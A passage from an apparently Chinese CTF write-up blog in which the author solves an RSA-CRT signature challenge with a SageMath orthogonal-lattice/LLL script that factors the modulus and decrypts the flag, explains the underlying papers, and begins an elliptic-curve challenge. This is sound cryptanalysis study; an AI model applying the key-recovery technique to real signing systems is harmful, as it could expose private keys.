b'U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc}\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m\"\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf>6,<\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|{6\\xeb\\xe8U\\x91\\xa4\\xeb}\\xf4s;E\\xe72$i\\xdft\\xff\\'',\n       b'[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9<H\\xa2a\\xdc\\xf4`\\xac>\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f>\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\'`K\\xa5\\xf1\\xbf\"\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\'1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[',\n       b':\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2} \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19',\n       b\"8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02<\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05'o\\xf3!\\t\\x01\\x93'z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2}\\xe8\\x10\"\n       ]\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n\n\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4), 20)\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d, _n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n\n\nv = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])\n     for i in range(6)]\n\nLv = orthogonal_lattice(matrix(ZZ, v))\n\nresult = orthogonal_lattice(Lv.matrix_from_rows(range(0, 6-2)))\n\nfor x, y in combinations(result, 2):\n    for a in tqdm(range(-10, 10)):\n        for b in range(-10, 10):\n            z = a*x+b*y\n            if z.norm() > sqrt(6*n):\n                continue\n            else:\n                vv = vector(v)-z\n                for i in vv:\n                    if gcd(i, n) != 1:\n                        p = gcd(i, n)\n                        assert n % gcd(i, n) == 0\n                        q = n//p\n                        phi = (p-1)*(q-1)\n                        d = inverse_mod(e, phi)\n                        m = long_to_bytes(int(pow(enc, d, n)))\n                        print(m)\n                        exit()\n```\n\n### 原理\n\nRSA-CRT签名中计算了：\n$$\n\\sigma_p=\\mu(m)^d\\mod \\ p \\\\\\\\  \\sigma_q=\\mu(m)^d\\mod \\ q\n$$\n然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。\n题目中给出 6 对签名，每对签名用 CRT 不难算出\n$$\nv=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N'\n$$\n其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N'$ ，那么**上式在整数域上是成立的**。\n一对算不出，但是多对可以，组成向量，有：\n$$\n\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}\n$$\n其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。\n不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 $\\{\\boldsymbol{b}_1,...,\\boldsymbol{b}\\_{\\ell-1}\\}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）\n特别地，我们有：\n$$\n\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1\n$$\n~~（也不是很特别的感觉）~~\n现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：\n\n**情形1**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$\n\n**情形2**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$\n\n因为格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}\\_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}\\_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}\\_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积\n$$\nV=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}\\_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}\\_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}\\_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)\n$$\n盲猜是一个随机的格。特别地，我们有：\n$$\n||\\boldsymbol{b}\\_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2\n$$\n\n一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,...,\\ell-2$ ， $\\boldsymbol{b}\\_j$ 应该是情形1中。这意味着这些向量生成 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 中一个满秩的子格 $L'=\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。\n取正交格，我们得到 $(L')^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L'$ 的正交格 $(L')^\\bot$ 。令 $\\{\\boldsymbol{x'},\\boldsymbol{y'}\\}$ 为一组该格的约化基，我们可以枚举 $(L')^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x'}$ 和 $\\boldsymbol{y'}$ 线性组合的所有格向量。高斯启发式表明这大约为：\n$$\n\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L')^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)\n$$\n这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L')^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：\n$$\n\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\\\\\\n\\boldsymbol{v}=\\boldsymbol{y}\\mod q\n$$\n故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。\n\n### 拓展阅读-正交格\n\n令 $\\mathbf{b}_1,...,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。\n\n如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。\n\n> 笔者注记：\n这里首先将 $\\mathit{\\Lambda}$ 张成一个**有理数空间**，不局限于**整系数**向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是**欧几里得**的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。\nPS:发现自己念了十年的欧几里得，难怪输入法打不出来（）\n\n令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 ~~（奇怪的表示方法）~~。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。\n\n> 笔者注记：\n看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即**任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$** 。\n再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，**注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了**，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。\n至于其维度为何是 $n-d$ ，有个概念叫**正交补**，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。\n这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。\n\n在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：\n\n$$\n\\mathbf{b}\\_j =\n\\begin{pmatrix}\nb_{1,j} \\\\\\\\\nb_{2,j} \\\\\\\\\n\\vdots \\\\\\\\\nb_{n,j}\n\\end{pmatrix}\n$$\n（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）\n\n定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。\n\n> 笔者注记：\n这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）\n至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为\n$$\n\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =\n\\begin{pmatrix}\n\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\\\\\\n\\vdots & \\ddots & \\vdots \\\\\\\\\n\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle\n\\end{pmatrix}\n$$\n不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。\n这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。\n\n**定理1** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：\n$$\n\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}\n$$\n其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n\n**推论2** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。\n\n**定理3** 令 $(\\mathbf{b}_1,...,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：\n\n1. $\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$\n2. 对任意线性无关的向量 $\\mathbf{x}_1,...,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：\n$$\n||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,...,||\\mathbf{x}_t||)\n$$\n\n我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}\\_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b\\_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。\n\n$$\nB^-=\n\\begin{pmatrix}\nc\\times b_{1,1} & c\\times b_{2,1} & \\cdots & c\\times b_{n,1} \\\\\\\\\nc\\times b_{1,2} & c\\times b_{2,2} & \\cdots & c\\times b_{n,2} \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\nc\\times b_{1,d} & c\\times b_{2,d} & \\cdots & c\\times b_{n,d} \\\\\\\\\n1 & 0 & \\cdots & 0 \\\\\\\\\n0 & 1 & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 1\n\\end{pmatrix}\n$$\n矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。\n设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。~~（这段翻译累死我了）~~\n令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么\n\n$$\np_{\\uparrow}(\\mathbf{y})=\n\\begin{pmatrix}\n\\mathbf{y}.\\mathbf{b}\\_1 \\\\\\\\\n\\vdots \\\\\\\\\n\\mathbf{y}.\\mathbf{b}\\_d\n\\end{pmatrix}\n$$\n因此，当且仅当 $p\\_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。\n\n**定理4** 令 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若\n\n$$\nc>2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})\n$$\n则 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。\n\n使用阿达马不等式，我们得到以下算法：\n\n**算法5** 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,...,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。\n\n1. 选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$\n\n2. 计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,...,\\mathbf{b}\\_d$ 对应的 $n\\times d$ 矩阵 $B=(b\\_{i,j})$\n\n3. 计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$\n\n4. 输出 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$\n\n可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）\n\n> 笔者注记：\n$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。\n\n#### 实现\n\n之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    LB = B.transpose().left_kernel(basis=\"LLL\").basis_matrix()\n    return LB\n```\n\n但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）\n于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4),20)    # this bound can be adjusted as needed\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d,_n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n```\n\n## 参考\n\n* [P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.](https://link.springer.com/chapter/10.1007/BFb0052236)\n\n* [Modulus Fault Attacks Against RSA-CRT Signatures](https://link.springer.com/article/10.1007/s13389-011-0015-x)\n\n* [知乎 线性代数之——正交向量与子空间](https://zhuanlan.zhihu.com/p/50483906)\n\n* [知乎 格拉姆矩阵（Gram matrix）详细解读](https://zhuanlan.zhihu.com/p/187345192)\n","slug":"2022巅峰极客 Crypto","published":1,"updated":"2022-11-27T11:46:22.470Z","_id":"clazajjqx0003yo6g2i0zaqlz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>有瓜吃，美滋滋。</p>\n<span id=\"more\"></span>\n\n<p>题目质量一般，知识问答还全是搬运今年 ciscn 的。<br>然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。</p>\n<h2 id=\"point-power\"><a href=\"#point-power\" class=\"headerlink\" title=\"point-power\"></a>point-power</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secrets <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"built_in\">len</span>(flag)==<span class=\"number\">42</span></span><br><span class=\"line\">p=getPrime(<span class=\"number\">600</span>)</span><br><span class=\"line\">a=bytes_to_long(flag)</span><br><span class=\"line\">b=randrange(<span class=\"number\">2</span>,p-<span class=\"number\">1</span>)</span><br><span class=\"line\">E=EllipticCurve(GF(p),[a,b])</span><br><span class=\"line\">G=E.random_element()</span><br><span class=\"line\"></span><br><span class=\"line\">x1,y1,_=G</span><br><span class=\"line\">G=<span class=\"number\">2</span>*G</span><br><span class=\"line\">x2,y2,_=G</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;b = <span class=\"subst\">&#123;b&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x1 = <span class=\"subst\">&#123;x1&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x2 = <span class=\"subst\">&#123;x2&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class=\"line\"><span class=\"string\">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class=\"line\"><span class=\"string\">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class=\"line\"><span class=\"string\">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。<br>首先查到椭圆曲线的加法（两点相同的情形）：<br>$$<br>x_2=m^2-2x_1\\ (mod\\ p) \\ with \\ m=\\frac{3x_1^2+a}{2y_1}<br>$$<br>又在Sagemath文档查到曲线定义 